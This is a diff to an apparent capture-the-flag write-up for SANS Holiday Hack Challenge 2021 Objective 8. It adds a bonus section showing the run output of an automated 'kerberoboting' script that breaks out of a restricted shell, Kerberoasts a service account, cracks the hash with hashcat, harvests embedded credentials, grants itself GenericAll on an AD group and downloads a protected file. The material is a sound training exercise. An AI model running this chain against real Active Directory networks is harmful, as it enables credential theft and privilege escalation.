@@ -85,10 +85,59 @@ $domainDirEntry.dispose()
 <p>After a few minutes, our new group membership gets replicated to the samba file server, so that we now have access to the secret document:</p>
 <pre><code>smbclient '\\10.128.3.30\research_dep'
 smb: \&gt; dir
-. D 0 Thu Dec 2 16:39:42 2021
-.. D 0 Mon Dec 20 08:01:35 2021
-SantaSecretToAWonderfulHolidaySeason.pdf N 173932 Thu Dec 2 16:38:26 2021
+  .                                   D        0  Thu Dec  2 16:39:42 2021
+  ..                                  D        0  Fri Dec 24 08:01:27 2021
+  SantaSecretToAWonderfulHolidaySeason.pdf      N   173932  Thu Dec  2 16:38:26 2021
+
+		41089256 blocks of size 1024. 34373492 blocks available
+
 </code></pre>
-<p>The PDF document lists <strong>Kindness</strong> as first secret ingredient for a wonderful holiday season.</p>
+<p>The <a href="https://github.com/joergschwarzwaelder/hhc2021/blob/master/Objective-8/SantaSecretToAWonderfulHolidaySeason.pdf">PDF document</a> lists <strong>Kindness</strong> as first secret ingredient for a wonderful holiday season.</p>
+<h3 id="bonus-kerberoboting">Bonus: Kerberoboting</h3>
+<p>This whole process was automated in an <code>expect</code> script named <code>kerberoboting</code>, so that you can enjoy a brew whilst your computer does the work.<br>
+It just requires you to register at <a href="https://register.elfu.org">https://register.elfu.org</a>, have <code>hashcat</code> installed in the PATH and a working CeWL in the local directory:</p>
+<pre><code>joergen@northpole:~$ ./kerberoboting jsfdgdsjjl 'Ndcopkmbo#'
+#
+# Kerberoboting in progress - get a brew and lean back
+#
+
+Retrieving the wordlist from register.elfu.org using CeWL
+Retrieving the OneRuleToRuleThemAll rule for Hashcat
+Logging on to grades.elfu.org using SSH
+Escaping the application using &lt;EOF&gt;
+Escaping the Python shell using os.system('bash')
+These shares are available on the file server
+smbclient -L '\\10.128.3.30'
+Enter WORKGROUP\jsfdgdsjjl's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	netlogon        Disk      
+	sysvol          Disk      
+	elfu_svc_shr    Disk      elfu_svc_shr
+	research_dep    Disk      research_dep
+	IPC$            IPC       IPC Service (Samba 4.3.11-Ubuntu)
+Running GetUserSPNs.py using my user id to enumerate SPNs linked to user accounts and get their password hashes
+Running Hashcat to crack the password
+  ok. Password is Snow2021!
+Getting access to samba \\10.128.3.30\elfu_svc_shr share as user elfu_svc
+Obtaining file GetProcessInfo.ps1 which has credentials for remote_elf embedded
+Granting myself GenericAll permissions on AD group Research Department and adding myself to it
+Getting access to samba \\10.128.3.30\research_dep using my user id
+dir
+  .                                   D        0  Thu Dec  2 16:39:42 2021
+  ..                                  D        0  Fri Dec 24 08:01:27 2021
+  SantaSecretToAWonderfulHolidaySeason.pdf      N   173932  Thu Dec  2 16:38:26 2021
+
+		41089256 blocks of size 1024. 34373492 blocks available
+smb: \&gt; Getting file SantaSecretToAWonderfulHolidaySeason.pdf
+Transferring file SantaSecretToAWonderfulHolidaySeason.pdf to local machine
+
+#
+# Have fun and explore more
+#
+
+jsfdgdsjjl@grades:~$ 
+</code></pre>
 <p><strong>Achievement: Kerberoasting on an Open Fire</strong></p>
 
